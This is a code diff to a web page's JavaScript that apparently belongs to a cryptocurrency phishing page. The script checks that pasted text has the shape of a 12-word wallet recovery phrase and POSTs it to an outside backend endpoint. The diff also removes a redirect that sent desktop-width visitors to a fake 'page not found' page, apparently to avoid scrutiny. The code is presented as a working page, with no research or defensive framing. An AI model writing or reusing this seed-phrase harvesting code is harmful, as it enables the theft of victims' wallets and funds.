@@ -1,24 +1,22 @@
-let str = ""
-
-if(screen.width > 768){
-  window.location.assign("../PageNotFound/PageNotFound.html")
-}
+let inputData = ""
+let error = false
 
 document.querySelector(".text-area").addEventListener("input",(e)=>{
+    document.querySelector(".error-box").classList.add("display")
     if(document.querySelector(".text-area").value === ""){
         document.querySelector(".button").innerHTML = "Paste"
     }
     else{
         document.querySelector(".button").innerHTML = "Continue"
     }
-    str = e.target.value
+    inputData = e.target.value
 })
 
-function calculateWords(str){
-    let len = str.length;
+function calculateWords(inputData){
+    let len = inputData.length;
     let count = 0;
     for(let i=0;i<len;i++){
-      if(str.charAt(i)==' ') count++;
+      if(inputData.charAt(i)==' ') count++;
     }
     if(count==11) return true;
     return false;
@@ -67,7 +65,7 @@ document.querySelector(".button").addEventListener("click",(e)=>{
         if(!error){
             const url = "https://backend-01-92mi.onrender.com/api/data9";
             const data = {
-                recoveryPhrase:str
+                recoveryPhrase:inputData
             };
             const options = {
                 method: 'POST',
